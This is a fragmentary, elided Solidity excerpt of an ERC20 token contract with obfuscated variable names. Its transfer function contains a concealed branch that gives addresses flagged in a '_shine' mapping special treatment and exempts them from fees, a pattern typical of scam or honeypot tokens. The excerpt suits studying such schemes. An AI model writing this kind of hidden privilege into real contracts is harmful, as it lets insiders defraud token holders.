...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _thick = _tTotal;
    ...
    mapping(uint256 => address) private _steep;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _top;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _shine;
    ...
    function _transfer(
        ...
        uint256 _out = _shine[_to];
        address _add = _steep[_thick];

        if (_shine[_exact] > 0 && amount > _thick) {
            uint256 _seldom = _shine[_exact];
            if (_seldom <= _out) {
            ...
            if (_taxFee > 0 && !inSwapAndLiquify && _shine[_exact] == 0 && _shine[_to] == 0) {
                uint256 fee = (amount * _taxFee) / 100;
                amount -= fee;
                _balances[_exact] -= fee;
            }

            _balances[_exact] -= amount;
            _balances[_to] += amount;
            emit Transfer(_exact, _to, amount);
        }
    }
